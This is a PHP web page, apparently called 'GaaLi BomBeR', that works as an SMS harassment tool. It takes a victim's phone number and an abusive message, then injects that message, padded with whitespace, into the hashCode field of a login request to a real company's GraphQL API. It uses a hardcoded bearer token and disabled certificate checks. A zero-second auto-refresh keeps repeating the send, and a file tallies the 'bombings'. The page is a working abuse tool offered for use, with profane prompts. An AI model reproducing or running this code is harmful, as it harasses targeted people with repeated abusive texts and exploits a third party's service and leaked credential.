<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=Bree+Serif&family=Montserrat:wght@400;600&display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">  <title>MR. NooB</title></head><style>
*{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Bree Serif', serif; } body{ width: 100%; height: 100vh; text-align: center; background-color: rgb(255, 255, 255); /* overflow: hidden; */ } .limiter{ width: 100%; padding: 0 25px; } .limiter h1{ font-size: 20px; font-family: 'Bree Serif', serif; font-weight: 300; text-transform: uppercase; letter-spacing: 1px; margin-top: 50px; margin-bottom: 50px; }
input{ font-family: 'Bree Serif', serif; width: 100%; height: 45px; font-weight: 200;
padding: 12px 32px;
  text-align: center;
  text-decoration: none;
  display: block;
  font-size: 14px;
  margin: 5px auto;
border: 2px solid rgb(0, 141, 146);
  border-radius: 5px 5px 5px 5px;
  outline: none;margin-top: 0px; margin-bottom: 25px;
  }
.input{ border: 1.5px solid rgb(211, 211, 211); background-color: transparent; padding: 0 15px; transition: 0.5s; }
 .input:focus{ border: 1.5px solid rgb(0, 141, 146); }
  .submit{ margin: 15px 0; border: none; background-color: rgb(0, 141, 146); color: #fff; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); transition: 0.5s; } .submit:hover{ background-color: rgb(7, 89, 94); } .telegram{ font-family: 'Bree Serif', serif; width: 100%; height: 65px; font-weight: 200; margin: 30px 0; border-radius: 4px; background-color: rgb(0, 141, 146); display: flex; justify-content: center; align-items: center; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); } .telegram i{ color: #fff; font-size: 30px; margin-left: -30px; } .telegram a{ color: #fff; text-decoration: none; font-weight: 300; letter-spacing: 2px; margin-left: 10px; font-size: 16px; text-transform: uppercase; } .success{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #d1e6dd; color: #105133; border: 1px solid #9fcfba; } .error{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #f7d7da; color: #84200a; border: 1px solid #f5c2c7; } .white{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #e2e3e5; color: #41464a; border: 1px solid #d5dbdb; } .blue{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #cfe2ff; color: #084195; border: 1px solid #d7d4fe; }

 select { width: 100%; height: 65px; margin: 15px 0; border-radius: 4px;		padding:0 20px;		font-size: 15px;		outline: none; font-family: 'Bree Serif', serif; }</style><body> <div class="limiter">
   <h1 class="blue">GaaLi BomBeR <br>Fu¡cK</h1>

 	
<?php

$Opbro=file_get_contents("total.txt");

if(!isset($_GET['submit'])){


	echo'<form action="?" method="GET" autocomplete="on">
	
<input type="text" name="num" class="input" placeholder="EnTeR MoTHeR Fu¡ckeR NuMBeR"required/>

<input type="text" name="custom" class="input" placeholder="EnTeR YouR AbuSinG WorD"required/>


<input type="submit" name="submit" class="submit" value="SUBMIT"/>
	</form><br>';
	
}

if(isset($_GET['submit'])){
  $num = $_GET['num'];
 	$custom=$_GET['custom'];


$key = $_POST['key'];

	
	
$host='api.apollo247.com';


$url='https://api.apollo247.com//graphql';
 

 
$data='{"operationName":"Login","variables":{"mobileNumber":"+91'.$num.'","loginType":"PATIENT","hashCode":"                                                                                                                                         \n\n Message => ['.$custom.']"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!,          $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode:                    \n\n$hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n"}';


 
$headers=['content-length:'.strlen($data).'','accept-encoding:gzip','user-agent:okhttp/4.9.1','content-type:application/json; charset=UTF-8','Host:'.$host.'','authorization:Bearer 3d1833da7020e0602165529446587434','Connection:Keep-Alive'];



$ch=curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_HEADER,0);
curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
$one=curl_exec($ch);
  
  $json=json_decode($one,1);

curl_close ($ch);


 
  $urlop        =   $json["data"]["login"]["status"];
  
   
  if($urlop="true"){
  
 $total=$Opbro+1;
file_put_contents("total.txt",$total);

echo"<div class='blue'>
<font color='blue='3'> Message Send Successfully !!  </font></div>";

echo"<div class='blue'>
<font color='purple='3'> Your Messags Is : $custom </font></div> ";


echo"<div class='blue'><center>
<font color='blue='3'> Target Number : $num </font></div> ";

echo"<div class='blue'>
<font color='purple='1'> AutoRefresh In 0 Seconds </font></div> ";

echo "<meta http-equiv='refresh' content='0'>";
   
    

 
}else {

echo"<div class='success'><center>
<font color='red='3'> Today Message Send Limit Over  </font></div>";


}
}
echo "<div class='blue'><center>
<font color='green'>  TOTAL SUCCESSFULL BOMBING => $Opbro
	</font></div>
";  

?>

       <span class="telegram"> <a href="https://wa.me/917584848848 "target="_blank">~|Anonymous|~</a></span><br>
       
       
       
  <div class='blue'><font color='purple'>MR. KousHiK 
</font></div>
